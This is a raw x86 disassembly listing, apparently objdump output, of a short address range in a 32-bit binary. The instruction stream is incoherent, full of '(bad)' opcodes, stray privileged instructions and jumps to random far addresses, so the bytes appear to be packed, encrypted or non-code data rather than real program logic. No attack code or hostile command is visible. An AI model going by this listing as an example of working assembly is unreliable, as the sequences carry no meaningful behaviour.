  40ab97:	aam    0xfa
  40ab99:	mov    eax,0x1a10a6c1
  40ab9e:	(bad)  
  40ab9f:	mov    ch,0x44
  40aba1:	aas    
  40aba2:	daa    
  40aba3:	push   edx
  40aba4:	or     eax,0xba0e769a
  40aba9:	(bad)  [ecx+ebp*4-0x4c]
  40abad:	xchg   ebx,eax
  40abae:	stc    
  40abaf:	lahf   
  40abb0:	mov    cl,0x90
  40abb2:	retf   0x74dc
  40abb5:	ficomp DWORD PTR [ebp+0x1]
  40abb8:	and    DWORD PTR [ebx-0x11],esp
  40abbb:	imul   ebp,DWORD PTR [edx+edx*4],0x115b1813
  40abc2:	out    0xc9,eax
  40abc4:	gs push esp
  40abc6:	out    0xcc,al
  40abc8:	cli    
  40abc9:	(bad)  
  40abca:	mov    BYTE PTR [eax+0x37],bl
  40abcd:	add    BYTE PTR [ecx+0x6f],ch
  40abd0:	pusha  
  40abd1:	lock idiv BYTE PTR [ebx-0x32]
  40abd5:	rcl    edi,cl
  40abd7:	in     eax,dx
  40abd8:	xor    eax,0xb4d45821
  40abdd:	mov    edx,DWORD PTR [eax+edx*2-0x2b]
  40abe1:	fldcw  WORD PTR [edx+ebp*1+0x587e732e]
  40abe8:	or     al,0xac
  40abea:	push   edx
  40abeb:	(bad)  
  40abec:	cmp    BYTE PTR [eax+0x127f6541],ah
  40abf2:	pop    ebx
  40abf3:	jno    0x40ac38
  40abf5:	(bad)  [eax-0x2fe46ed5]
  40abfb:	mov    esi,0xc8270321
  40ac00:	pop    DWORD PTR [esi-0x461c5a56]
  40ac06:	lods   al,BYTE PTR gs:[esi]
  40ac08:	push   ds
  40ac09:	mov    esi,0x49dbb7be
  40ac0e:	xchg   BYTE PTR [esi],bl
  40ac10:	and    al,bl
  40ac12:	sub    al,0xb1
  40ac14:	cdq    
  40ac15:	pop    es
  40ac16:	add    edx,0xffffffe8
  40ac19:	jno    0x40ac87
  40ac1b:	and    DWORD PTR [ebx-0x4c4f1701],edx
  40ac21:	hlt    
  40ac22:	and    BYTE PTR [ebp+0x31],al
  40ac25:	lods   eax,DWORD PTR ds:[esi]
  40ac26:	push   ebx
  40ac27:	add    al,0x72
  40ac29:	xchg   edx,eax
  40ac2a:	dec    eax
  40ac2b:	loope  0x40abf2
  40ac2d:	push   cs
  40ac2e:	mov    ecx,0x31ba382c
  40ac33:	jl     0x40abec
  40ac35:	out    dx,al
  40ac36:	fcomp  DWORD PTR [edi+eax*4+0x66]
  40ac3a:	add    ch,BYTE PTR [eax+0x706bb8c9]
  40ac40:	adc    dl,bl
  40ac42:	mov    dl,0x56
  40ac44:	jg     0x40ac2b
  40ac46:	je     0x40acb6
  40ac48:	push   edi
  40ac49:	jmp    0xae0:0xa6ed0200
  40ac50:	cmp    ebp,esi
  40ac52:	jecxz  0x40ac43
  40ac54:	cmp    esi,esi
  40ac56:	stos   DWORD PTR es:[edi],eax
  40ac57:	dec    ecx
  40ac58:	mov    bl,0xba
  40ac5a:	sub    DWORD PTR [ecx],edx
  40ac5c:	xor    edi,esp
  40ac5e:	ins    BYTE PTR es:[edi],dx
  40ac5f:	cmp    DWORD PTR [ecx+0xe],eax
  40ac62:	xchg   esi,eax
  40ac63:	daa    
  40ac64:	adc    al,0xfa
  40ac66:	and    al,0x8b
  40ac68:	jg     0x40ac81
  40ac6a:	je     0x40acd1
  40ac6c:	inc    edx
  40ac6e:	mov    esi,0xc00a1838
  40ac73:	bound  esi,QWORD PTR [ebx-0x4122ae34]
  40ac79:	(bad)  
  40ac7a:	stc    
  40ac7b:	mov    ds:0xc186e54a,al
  40ac80:	popa   
  40ac81:	lea    ecx,[edi+0x117e6de5]
  40ac87:	or     al,0x1d
  40ac89:	sbb    esp,DWORD PTR [ebp+ebx*8-0xf]
  40ac8d:	push   eax
  40ac8e:	lahf   
  40ac8f:	int    0x9
  40ac91:	adc    al,0x2c
  40ac93:	adc    edx,DWORD PTR [esi]
  40ac95:	push   esi
  40ac96:	mov    ch,0xd1
  40ac98:	ins    BYTE PTR es:[edi],dx
  40ac99:	cwde   
  40ac9a:	shr    DWORD PTR [ebx-0x1e],0x3a
  40ac9e:	mov    bh,0x8b
  40aca0:	xchg   ecx,eax
  40aca1:	fadd   QWORD PTR [esi]
  40aca3:	xor    al,0xa6
  40aca5:	loop   0x40acfc
  40aca7:	push   cs
  40aca8:	inc    esi
  40aca9:	cdq    
  40acaa:	fcomp  QWORD PTR ds:0x138bbcd7
  40acb0:	mov    edx,0x7cef0755
  40acb5:	push   cs
  40acb6:	mov    esp,0x1b60c128
  40acbb:	stos   BYTE PTR es:[edi],al
  40acbc:	inc    esp
  40acbd:	sbb    BYTE PTR [eax+0x1b],bh
  40acc0:	bswap  ebx
  40acc2:	rcr    DWORD PTR [ebp+ebp*2-0x34],cl
  40acc6:	xchg   ebx,eax
  40acc7:	push   ecx
  40acc8:	inc    ebp
  40acc9:	leave  
  40acca:	neg    DWORD PTR [edi]
  40accc:	imul   esp,DWORD PTR [esi+edx*8-0x5d],0x5e
  40acd1:	les    esp,FWORD PTR [edx]
  40acd3:	pop    ss
  40acd4:	shl    DWORD PTR [eax+0x106ccb03],cl
  40acda:	mov    cl,BYTE PTR [ebx+0x4d]
  40acdd:	push   es
  40acde:	std    
  40acdf:	and    dl,0x99
  40ace2:	inc    edx
  40ace3:	shl    DWORD PTR [edi-0x37e1bfaa],cl
  40ace9:	iret   
  40acea:	xor    edi,esp
  40acec:	mov    ch,0x70
  40acee:	mov    dh,0xe7
  40acf0:	mov    bh,0xb
  40acf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acf3:	sbb    esi,ebx
  40acf5:	and    BYTE PTR ds:0x21c8900c,ch
  40acfb:	ds shr bl,1
  40acfe:	jg     0x40acee
  40ad00:	stos   BYTE PTR es:[edi],al
  40ad01:	leave  
  40ad02:	xor    DWORD PTR [edi],ebx
  40ad04:	dec    edx
  40ad05:	int3   
  40ad06:	pusha  
  40ad07:	push   ds
  40ad08:	loope  0x40ad6d
  40ad0a:	retf   
  40ad0b:	imul   eax,esi,0x20
  40ad0e:	js     0x40aca4
  40ad10:	jecxz  0x40ad02
  40ad12:	push   cs
  40ad13:	pop    ss
  40ad14:	add    eax,0xbabb29e8
  40ad19:	jno    0x40ad70
  40ad1b:	xchg   esp,eax
  40ad1c:	add    al,0x74
  40ad1e:	ficom  WORD PTR [ebp-0x54]
  40ad21:	cwde   
  40ad22:	add    dh,dl
  40ad24:	xchg   ebp,eax
  40ad25:	jmp    0x29c3f6a0
  40ad2a:	and    esp,DWORD PTR [edi+esi*1-0x69f8a93d]
  40ad31:	arpl   WORD PTR [ebp+0x3c9dd09c],sp
  40ad37:	pusha  
  40ad38:	test   BYTE PTR [ecx+0x3f],bh
  40ad3b:	push   ds
  40ad3c:	jb     0x40ad04
  40ad3e:	inc    ebp
  40ad3f:	xor    al,0x85
  40ad41:	sub    BYTE PTR [ecx-0x80],0x8b
  40ad45:	or     edi,eax
  40ad47:	aam    0xe9
  40ad49:	push   edi
  40ad4a:	or     ecx,DWORD PTR [edx]
  40ad4c:	scas   al,BYTE PTR es:[edi]
  40ad4d:	aam    0x4d
  40ad4f:	mov    eax,ds:0x81fcc64d
  40ad54:	(bad)  
  40ad55:	call   0x30527b6a
  40ad5a:	dec    esi
  40ad5b:	xchg   esi,eax
  40ad5c:	cmp    al,0xa
  40ad5e:	xor    DWORD PTR [ebp-0x5f65cccb],0xffffff8e
  40ad65:	mov    edi,0x5cb13c4f
  40ad6a:	call   0xe127:0x5435613f
  40ad71:	sbb    eax,0xe48b98d6
  40ad76:	push   ecx
  40ad77:	push   0xffffff93
  40ad79:	cmp    DWORD PTR [ecx+0x21],ecx
  40ad7c:	xchg   ebx,eax
  40ad7d:	sub    BYTE PTR [eax+esi*2],dl
  40ad80:	add    eax,0xf4d58b8e
  40ad85:	xor    ah,cl
  40ad87:	xor    eax,0xb7b6301c
  40ad8c:	div    BYTE PTR [ebx+0x11]
  40ad8f:	mov    bh,0x50
  40ad91:	adc    BYTE PTR [edi],ah
  40ad93:	mov    ah,0xef
  40ad95:	push   ss
  40ad96:	jmp    0x8069f135
  40ad9b:	dec    eax
  40ad9c:	mov    ds:0x7711986f,al
  40ada1:	aaa    
  40ada2:	xchg   esp,eax
  40ada3:	dec    ebp
  40ada4:	xchg   BYTE PTR [edi],dl
  40ada6:	cs dec ecx
  40ada8:	adc    BYTE PTR [edi-0x3d104bb0],ah
  40adae:	cdq    
  40adaf:	mov    eax,ds:0x52c7da2e
  40adb4:	inc    edi
  40adb5:	pop    edx
  40adb6:	mov    cl,0x2b
  40adb8:	repnz mov ds:0x5c58f31b,al
  40adbe:	push   ebp
  40adbf:	cdq    
  40adc0:	sub    BYTE PTR [ecx-0x6b4ac6bf],dl
  40adc6:	and    dh,BYTE PTR [ebx+0x69]
  40adc9:	test   al,0x80
  40adcb:	xor    BYTE PTR [esi-0x51],0x36
  40adcf:	jg     0x40ad98
  40add1:	pop    eax
  40add2:	fadd   st(6),st
  40add4:	jmp    0xa6a6e6a9
  40add9:	push   es
  40adda:	push   ds
  40addb:	xchg   esp,eax
  40addc:	jne    0x40ad61
  40adde:	data16 icebp 
  40ade0:	mov    dh,0x33
  40ade2:	repnz sub dl,dh
  40ade5:	aas    
  40ade6:	xchg   edx,eax
  40ade7:	pop    ds
  40ade8:	repnz and eax,0x7c3f4335
  40adee:	lahf   
  40adef:	cmp    ecx,DWORD PTR [edi]
  40adf1:	out    0xe0,eax
  40adf3:	js     0x40ae4a
  40adf5:	stos   BYTE PTR es:[edi],al
  40adf6:	cmp    BYTE PTR [edx+eiz*1],dh
  40adf9:	punpckhwd mm6,QWORD PTR [eax]
  40adfc:	std    
  40adfd:	xchg   edx,eax
  40adfe:	jmp    0x677b:0xd9764910
  40ae05:	xor    bl,bl
  40ae07:	mov    WORD PTR [eax],ss
  40ae09:	leave  
  40ae0a:	xor    al,0xa9
  40ae0c:	inc    ebx
  40ae0d:	outs   dx,DWORD PTR ds:[esi]
  40ae0e:	pusha  
  40ae0f:	xchg   ecx,eax
  40ae10:	out    0xf8,eax
  40ae12:	jns    0x40ae1b
  40ae14:	mov    eax,ds:0xf934853a
  40ae19:	daa    
  40ae1a:	mov    ds:0xa8ef1895,eax
  40ae1f:	cmp    al,0x20
  40ae21:	inc    edi
  40ae22:	jb     0x40ae19
  40ae24:	push   ebp
  40ae25:	call   0xda90:0x6d55a253
  40ae2c:	(bad)
  40ae32:	retf   
  40ae33:	call   DWORD PTR [eax-0x7b85b687]
  40ae39:	dec    esp
  40ae3a:	pop    es
  40ae3b:	xchg   esp,eax
  40ae3c:	aam    0x27
  40ae3e:	mov    eax,ds:0x49abd60c
  40ae43:	jb     0x40add2
  40ae45:	jecxz  0x40ae1d
  40ae47:	xchg   ecx,eax
  40ae48:	jno    0x40ae31
  40ae4a:	mov    ah,0x92
  40ae4c:	inc    eax
  40ae4d:	(bad)  
  40ae4e:	sti    
  40ae4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae50:	nop
  40ae51:	ins    DWORD PTR es:[edi],dx
  40ae52:	pop    es
  40ae53:	inc    esp
  40ae54:	sub    eax,ebp
  40ae56:	cmp    edi,DWORD PTR [eax+0x6d]
  40ae59:	icebp  
  40ae5a:	dec    edi
  40ae5b:	jle    0x40ae56
  40ae5d:	cli    
  40ae5e:	sbb    BYTE PTR [edx],0x47
  40ae61:	adc    eax,0x87f7e8f6
  40ae66:	ins    DWORD PTR es:[edi],dx
  40ae67:	mov    dh,0x33
  40ae69:	cs (bad) 
  40ae6b:	mov    ah,0xa
  40ae6d:	inc    eax
  40ae6e:	fild   WORD PTR [eax]
  40ae70:	mov    al,ds:0xc8fb2e5c
  40ae75:	in     eax,dx
  40ae76:	adc    dh,dh
  40ae78:	test   DWORD PTR [edx],ecx
  40ae7a:	adc    eax,DWORD PTR [esi+0x2a50c26d]
  40ae80:	mov    ecx,esp
  40ae82:	in     eax,dx
  40ae83:	fsub   QWORD PTR [edx]
  40ae85:	retf   0x7da2
  40ae88:	outs   dx,BYTE PTR ds:[esi]
  40ae89:	aas    
  40ae8a:	leave  
  40ae8b:	pop    esp
  40ae8c:	pop    edi
  40ae8d:	cmp    BYTE PTR [ebx+ebp*1-0x5],al
  40ae91:	scas   al,BYTE PTR es:[edi]
  40ae92:	in     eax,0xe9
  40ae94:	mov    ebx,DWORD PTR [ebx-0xa0015e8]
  40ae9a:	cmp    ebx,DWORD PTR [esi+edx*4+0x4f1538a3]
  40aea1:	and    dh,BYTE PTR [ecx+ebp*1+0x105bfb22]
  40aea8:	xchg   BYTE PTR [eax-0x44],cl
  40aeab:	mov    bl,0x29
  40aead:	sub    cl,bl
  40aeaf:	sbb    BYTE PTR [ebx+0x4c63a76d],cl
  40aeb5:	jecxz  0x40ae55
  40aeb7:	out    dx,al
  40aeb8:	sti    
  40aeb9:	stos   BYTE PTR es:[edi],al
  40aeba:	or     BYTE PTR [ecx-0x90f07e],0x37
  40aec1:	mov    cl,0xc4
  40aec3:	xchg   edi,eax
  40aec4:	in     al,0x2d
  40aec6:	cmp    BYTE PTR [esi],bh
  40aec8:	mov    dl,BYTE PTR [edx+0x5b354659]
  40aece:	jmp    0x40af46
  40aed0:	jb     0x40af16
  40aed2:	aam    0x74
  40aed4:	bound  edx,QWORD PTR [edi-0x5a67288e]
  40aeda:	push   0x8fe83e69
  40aedf:	test   eax,0x7925c2b9
  40aee4:	xchg   DWORD PTR [esi],eax
  40aee6:	mov    WORD PTR [edi+0x3b9c9e15],?
  40aeec:	jne    0x40aef2
  40aeee:	sbb    DWORD PTR [edi+eiz*2],esi
  40aef1:	fimul  WORD PTR [edx-0x2e]
  40aef4:	ret    
  40aef5:	jnp    0x40af2c
  40aef7:	out    dx,al
  40aef8:	es std 
  40aefa:	cwde   
  40aefb:	push   cs
  40aefc:	in     al,0xe
  40aefe:	out    dx,al
  40aeff:	nop
  40af00:	jle    0x40af24
  40af02:	ja     0x40ae85
  40af04:	sub    DWORD PTR [ecx],0x3e
  40af07:	mov    eax,DWORD PTR ds:0xbdcd556d
  40af0d:	sub    BYTE PTR [edx],dh
  40af0f:	sbb    bh,BYTE PTR [esi+0x47]
  40af12:	and    eax,0x343928ff
  40af17:	cmp    DWORD PTR [ebp+0x67f2ef09],ecx
  40af1d:	xchg   edx,eax
  40af1e:	xchg   ebp,eax
  40af1f:	in     al,dx
  40af20:	les    ecx,FWORD PTR [edx+0x4b]
  40af23:	jg     0x40aea9
  40af25:	adc    BYTE PTR [edx],0x74
  40af28:	jbe    0x40afa0
  40af2a:	outs   dx,DWORD PTR ds:[esi]
  40af2b:	addr16 ja 0x40af6e
  40af2e:	add    BYTE PTR [ebx+0x32],al
  40af31:	outs   dx,DWORD PTR ds:[esi]
  40af32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af33:	out    0xf7,eax
  40af35:	xchg   BYTE PTR [ecx],cl
  40af37:	sbb    DWORD PTR [ebp-0x42e1818e],edi
  40af3d:	and    al,BYTE PTR [esi-0x347a067d]
  40af43:	rcl    DWORD PTR [ebx-0x782d5562],cl
  40af49:	push   edi
  40af4a:	dec    edi
  40af4b:	inc    esp
  40af4c:	or     eax,0x62bb5ea5
  40af51:	fsubr  QWORD PTR gs:[eax-0x1c117a53]
  40af58:	in     eax,0x55
  40af5a:	jecxz  0x40af61
  40af5c:	add    bl,BYTE PTR [ecx]
  40af5e:	cwde   
  40af5f:	in     eax,0xf7
  40af61:	(bad)  
  40af62:	stc    
  40af63:	or     ah,BYTE PTR [ebp-0x7]
  40af66:	rcl    DWORD PTR [esi-0x44],1
  40af69:	iret   
  40af6a:	lea    edi,[edx]
  40af6c:	mov    esp,0x39a4f54a
  40af71:	add    al,BYTE PTR [esi-0x45]
  40af74:	rcl    DWORD PTR [ebp+0x8d9d0b3],1
  40af7a:	js     0x40af1b
  40af7c:	repnz (bad) 
  40af7e:	outs   dx,BYTE PTR ds:[esi]
  40af80:	jmp    0xc4faef51
  40af85:	jo     0x40afe5
  40af87:	mov    cs,WORD PTR [ecx]
  40af89:	jne    0x40aff9
  40af8b:	xor    eax,DWORD PTR [edx+0x3a]
  40af8e:	or     DWORD PTR ds:0xcdb79015,ecx
  40af94:	cld    
  40af95:	mov    edx,0x11aee223
  40af9a:	fcom   st(0)
  40af9c:	aad    0x44
  40af9e:	sub    al,0x7d
  40afa0:	sub    DWORD PTR [esi-0x4b15bebd],esp
  40afa6:	test   eax,0x3476d010
  40afab:	dec    edi
  40afac:	(bad)  
  40afad:	shl    BYTE PTR [edi],1
  40afaf:	(bad)  
  40afb1:	popa   
  40afb2:	pop    es
  40afb3:	outs   dx,DWORD PTR ss:[esi]
  40afb5:	mov    ch,0x0
  40afb7:	or     edx,eax
  40afb9:	(bad)  
  40afba:	aad    0x6f
  40afbc:	mov    ds:0xdf60973a,eax
  40afc1:	dec    eax
  40afc2:	mov    bh,dh
  40afc4:	aaa    
  40afc5:	aas    
  40afc6:	dec    esi
  40afc7:	cld    
  40afc8:	mov    ecx,0xb5ca2c7c
  40afcd:	rcl    DWORD PTR [ecx],cl
  40afcf:	adc    eax,DWORD PTR [ebx]
  40afd1:	jg     0x40afb3
  40afd3:	outs   dx,DWORD PTR ds:[esi]
  40afd4:	sub    eax,0xf3a5fd37
  40afd9:	outs   dx,DWORD PTR ds:[esi]
  40afda:	hlt    
  40afdb:	retf   
  40afdc:	in     eax,0x93
  40afde:	inc    edi
  40afdf:	xchg   edx,esp
  40afe1:	fst    QWORD PTR [eax+0x3]
  40afe4:	jp     0x40b05a
  40afe6:	fadd   DWORD PTR [ecx+0x7c]
  40afe9:	aaa    
  40afea:	das    
  40afeb:	loope  0x40af92
  40afed:	pop    ds
  40afee:	push   cs
  40afef:	fs retf 0x5f9d
  40aff3:	(bad)  
  40aff5:	test   ecx,esi
  40aff7:	psrld  mm0,QWORD PTR [ecx+0x7b]
  40affb:	mov    ds:0xd42e4b2c,eax
  40b000:	xchg   edi,eax
  40b001:	sti    
  40b002:	inc    esi
  40b003:	ja     0x40b02c
  40b005:	dec    ecx
  40b006:	(bad)  
  40b007:	call   0xa90c:0x7d68f535
  40b00e:	pop    edi
  40b00f:	cs mov bl,0x51
  40b012:	push   es
  40b013:	out    dx,al
  40b014:	pop    esi
  40b015:	push   cs
  40b016:	pop    si
  40b018:	jb     0x40b072
  40b01a:	mov    eax,ds:0xdc6ec640
  40b01f:	nop
  40b020:	xchg   ecx,eax
  40b021:	div    BYTE PTR [ebx-0x34]
  40b024:	mov    WORD PTR ds:0x85bca0c0,ss
  40b02a:	sub    BYTE PTR ds:0xe7ac5589,al
  40b030:	aad    0xab
  40b032:	cmp    al,0x63
  40b034:	inc    eax
  40b035:	and    cl,dl
  40b037:	cmp    DWORD PTR [esi-0x7ab7a721],edi
  40b03d:	ds leave 
  40b03f:	ret    0x97a
  40b042:	lods   eax,DWORD PTR ds:[esi]
  40b043:	xchg   DWORD PTR [edx-0x39],esi
  40b046:	xor    ah,BYTE PTR [edx-0x41]
  40b049:	jmp    0xe726:0xcee285fd
  40b050:	pop    ss
  40b051:	add    esi,DWORD PTR [edx+0x4206fd1b]
  40b057:	sbb    al,0x17
  40b059:	sub    dl,BYTE PTR [ebp+0x3378be40]
  40b05f:	jmp    0x5f4bda73
  40b064:	cmp    BYTE PTR [edi+0x50cff6c0],ch
  40b06a:	xchg   esi,eax
  40b06b:	les    esi,FWORD PTR [edx]
  40b06d:	hlt    
  40b06e:	rol    BYTE PTR [esi-0x393092b9],1
  40b074:	mov    esp,0x5c9a3ca8
  40b079:	jbe    0x9d6f5939
  40b07f:	xor    eax,0x60bdfd75
  40b084:	cld    
  40b085:	bound  ebp,QWORD PTR [edx+0x274733a]
  40b08b:	or     al,0x4
  40b08d:	sbb    BYTE PTR [eax+0x7279c40],0x5a
  40b094:	les    esp,FWORD PTR [esi+0x78dd3ddc]
  40b09a:	inc    ebp
  40b09b:	hlt    
  40b09c:	pusha  
  40b09d:	adc    DWORD PTR [ecx+0x4f087fa1],0xffffff91
  40b0a4:	imul   ecx,edi,0x1dc1cabf
  40b0aa:	cli    
  40b0ab:	scas   eax,DWORD PTR es:[edi]
  40b0ac:	test   eax,0x1bf41bfb
  40b0b1:	rol    DWORD PTR [ebp+0xb5772bc],cl
  40b0b7:	sub    DWORD PTR [edx-0x18],ebp
  40b0ba:	jo     0x40b0d2
  40b0bc:	xchg   BYTE PTR [edx],ah
  40b0be:	je     0x40b0ca
  40b0c0:	sub    edi,DWORD PTR [ebp+0x58]
  40b0c3:	xor    eax,0x9eb8abaa
  40b0c8:	leave  
  40b0c9:	mov    ds:0xd5d7195c,eax
  40b0ce:	(bad)  
  40b0cf:	es call 0xd186:0xfb2d2a23
  40b0d7:	pusha  
  40b0d8:	ss mov edx,0xeb8edd84
  40b0de:	inc    eax
  40b0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0e0:	push   edi
  40b0e1:	scas   al,BYTE PTR es:[edi]
  40b0e2:	push   ebp
  40b0e3:	jb     0x40b105
  40b0e5:	mov    esi,0xbc4848de
  40b0ea:	jmp    0x1bf2dc25
  40b0ef:	pop    edx
  40b0f0:	pop    edi
  40b0f1:	scas   al,BYTE PTR es:[edi]
  40b0f2:	jl     0x40b07d
  40b0f4:	jnp    0x40b114
  40b0f6:	add    DWORD PTR [edi-0x6aa6c5d4],0xa243a88f
  40b100:	sub    eax,DWORD PTR [edx+0x2]
  40b103:	push   0xe9b22403
  40b108:	xlat   BYTE PTR ds:[ebx]
  40b109:	mov    ch,bh
  40b10b:	sub    DWORD PTR [ecx+0x1e],esp
  40b10e:	sbb    eax,0x46af5d1b
  40b113:	xor    al,dl
  40b115:	imul   esi,DWORD PTR [ebp+0x4b],0x13640b20
  40b11c:	daa    
  40b11d:	fwait
  40b11e:	add    DWORD PTR [edx-0x78],0xffffffd5
  40b122:	or     bl,0x8d
  40b125:	mov    edx,0x4e9df25e
  40b12a:	push   0xa3a59cb1
  40b12f:	sub    al,0xf0
  40b131:	xchg   esp,eax
  40b132:	xchg   ebp,eax
  40b133:	retf   
  40b134:	mov    dl,0x4
  40b136:	cli    
  40b137:	pop    bp
  40b139:	cmp    esi,ebp
  40b13b:	jmp    0xb21302de
  40b140:	(bad)  
  40b141:	dec    edi
  40b142:	cmp    BYTE PTR [edi+eax*2-0x48482850],0x54
  40b14a:	or     BYTE PTR [esi-0x61],cl
  40b14d:	pop    eax
  40b14e:	imul   esi,DWORD PTR [eax-0x5c],0x50b325fa
  40b155:	and    DWORD PTR ss:[ebx+0x108b97f0],edx
  40b15c:	xor    al,0x92
  40b15e:	call   0x992eca2d
  40b163:	xor    DWORD PTR [ecx+0x1d],edi
  40b166:	push   ecx
  40b167:	sbb    BYTE PTR [ebx-0x2ce7c5af],cl
  40b16d:	std    
  40b16e:	das    
  40b16f:	lahf   
  40b170:	pop    ebx
  40b171:	cmc    
  40b172:	sub    ebx,0x32
  40b175:	push   0xee880814
  40b17a:	(bad)  
  40b17b:	mov    edx,0x62ae832d
  40b180:	inc    ecx
  40b181:	pop    es
  40b182:	cld    
  40b183:	adc    cl,bh
  40b185:	jg     0x40b14a
  40b187:	add    al,0x26
  40b189:	and    DWORD PTR [edi*8+0x5d4d6dc8],edx
  40b190:	call   edx
  40b192:	or     al,0x3d
  40b194:	loop   0x40b14a
  40b196:	add    esi,DWORD PTR [edi]
  40b198:	sbb    esi,DWORD PTR [ebp+0x3d301d14]
  40b19e:	xor    eax,0x5fbc4b28
  40b1a3:	mov    esp,0xdd987937
  40b1a8:	add    eax,0xd811d960
  40b1ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ae:	adc    dl,BYTE PTR [ebx+0x10]
  40b1b1:	aam    0xc6
  40b1b3:	call   0x725b:0xc2197966
  40b1ba:	push   esp
  40b1bb:	hlt    
  40b1bc:	or     esp,DWORD PTR [edi+ebp*2]
  40b1bf:	inc    esp
  40b1c0:	xchg   DWORD PTR [ebp+0x2269885f],edi
  40b1c6:	loopne 0x40b226
  40b1c8:	push   edx
  40b1c9:	inc    ebp
  40b1ca:	icebp  
  40b1cb:	scas   eax,DWORD PTR es:[edi]
  40b1cc:	loopne 0x40b1e6
  40b1ce:	or     DWORD PTR [ebp+ebx*2+0xb0a60],0x3a286da0
  40b1d9:	jae    0x40b1f4
  40b1db:	daa    
  40b1dc:	aas    
  40b1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1de:	or     ebx,DWORD PTR ds:0xe844e8c6
  40b1e4:	das    
  40b1e5:	rol    DWORD PTR [ebx+eiz*8+0x28f3e912],0x47
  40b1ed:	xor    al,0x41
  40b1ef:	out    0xc7,eax
  40b1f1:	call   0xfa21:0xc0fb90da
  40b1f8:	retf   
  40b1f9:	test   DWORD PTR [eax],esp
  40b1fb:	outs   dx,DWORD PTR ds:[esi]
  40b1fc:	stos   DWORD PTR es:[edi],eax
  40b1fd:	repz arpl bp,sp
  40b200:	push   esi
  40b201:	lahf   
  40b202:	sub    DWORD PTR [edi-0x1f93b7ac],esi
  40b208:	sbb    eax,0x70e46e8b
  40b20d:	retf   
  40b20e:	push   0x41
  40b210:	std    
  40b211:	aad    0xbb
  40b213:	xchg   esp,eax
  40b214:	sbb    esi,esi
  40b216:	or     al,0x24
  40b218:	inc    esi
  40b219:	inc    eax
  40b21a:	shl    ch,cl
  40b21c:	icebp  
  40b21d:	sbb    eax,esp
  40b21f:	lahf   
  40b220:	cmc    
  40b221:	push   edx
  40b222:	pop    ss
  40b223:	mov    eax,ds:0x2bdcd14
  40b228:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40b22a:	pop    esi
  40b22b:	xchg   ebx,eax
  40b22c:	mov    bl,0x74
  40b22e:	jle    0x40b27e
  40b230:	(bad)  
  40b231:	pop    ebp
  40b232:	xor    al,al
  40b234:	popa   
  40b235:	push   eax
  40b236:	adc    eax,0xbe706343
  40b23b:	sbb    dl,al
  40b23d:	add    eax,0xf9780694
  40b242:	push   esp
  40b243:	arpl   WORD PTR [esp+eax*4],si
  40b246:	add    al,0xca
  40b248:	(bad)  
  40b249:	into   
  40b24a:	xlat   BYTE PTR ds:[ebx]
  40b24b:	fdivp  st(2),st
  40b24d:	mov    dl,BYTE PTR [ebx-0x1e]
  40b250:	inc    ebp
  40b251:	sbb    BYTE PTR [edx+0x698c5c2e],0x53
  40b258:	mov    esi,0xc01b8154
  40b25d:	dec    edx
  40b25e:	xor    DWORD PTR [edx],0x5e
  40b261:	cmp    al,0xc6
  40b263:	and    BYTE PTR [eax],al
  40b265:	mov    BYTE PTR [edx],bh
  40b267:	jnp    0x40b250
  40b269:	cmp    DWORD PTR [edx],0x4ffa2741
  40b26f:	retf   0xbdc8
  40b272:	add    al,0x78
  40b274:	xchg   esi,eax
  40b275:	bound  edx,QWORD PTR [edx]
  40b277:	inc    ecx
  40b278:	ror    BYTE PTR [ebx+0x13],1
  40b27b:	imul   ecx,DWORD PTR fs:[edi+0x3d941183],0x5664417a
  40b286:	xor    eax,0x5a5ee470
  40b28b:	out    0x92,eax
  40b28d:	mov    gs,esi
  40b28f:	mov    ecx,0x1b93ba77
  40b294:	leave  
  40b295:	sub    DWORD PTR ds:0x459fd81b,0xffffffe2
  40b29c:	loop   0x40b2f8
  40b29e:	mov    eax,ds:0x5e57fdb1
  40b2a3:	sub    ebx,DWORD PTR [edi+0x6498ec62]
  40b2a9:	cdq    
  40b2aa:	pop    esp
  40b2ab:	mov    al,0x42
  40b2ad:	int    0xb0
  40b2af:	in     al,dx
  40b2b0:	push   ebp
  40b2b1:	push   ebx
  40b2b2:	xor    al,0xfa
  40b2b4:	add    BYTE PTR [eax-0x5d1066a],al
  40b2ba:	jmp    0x40b32c
  40b2bc:	ja     0x40b289
  40b2be:	out    dx,al
  40b2bf:	inc    ebx
  40b2c0:	mov    edx,0x4ad82bb
  40b2c5:	inc    esi
  40b2c6:	ins    BYTE PTR es:[edi],dx
  40b2c7:	dec    eax
  40b2c8:	js     0x40b2e5
  40b2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2cb:	jne    0x40b2a7
  40b2cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2ce:	in     eax,0xf5
  40b2d0:	xor    BYTE PTR [esi],ch
  40b2d2:	cmp    al,0x49
  40b2d4:	sub    al,0x9a
  40b2d6:	push   ebx
  40b2d7:	pusha  
  40b2d8:	adc    BYTE PTR [esi+eiz*4],ch
  40b2db:	and    DWORD PTR [ebx],eax
  40b2dd:	push   edi
  40b2de:	iret   
  40b2df:	jle    0x40b2ee
  40b2e1:	xlat   BYTE PTR ds:[ebx]
  40b2e2:	fld    TBYTE PTR [edi+0x4507f613]
  40b2e8:	fnclex 
  40b2ea:	shl    DWORD PTR [edi+0x4f4fc3e5],0x30
  40b2f1:	ins    BYTE PTR es:[edi],dx
  40b2f2:	add    ebp,0x65
  40b2f5:	shr    esi,0x46
  40b2f8:	push   ss
  40b2f9:	daa    
  40b2fa:	(bad)  
  40b2fb:	mov    al,0x9b
  40b2fd:	ss fldl2e 
  40b300:	call   0xe5a2cf60
  40b305:	out    0x6f,al
  40b307:	mov    esi,0x62af81b7
  40b30c:	push   esi
  40b30d:	push   esp
  40b30e:	outs   dx,DWORD PTR ds:[esi]
  40b310:	enter  0x183,0xb8
  40b314:	push   esi
  40b315:	bound  ecx,QWORD PTR [eax+0x4a]
  40b318:	sub    edi,DWORD PTR [esi]
  40b31a:	add    eax,0x3141d3d5
  40b31f:	push   ebp
  40b320:	mov    al,ds:0xe70ee796
  40b325:	int    0xdd
  40b327:	(bad)  
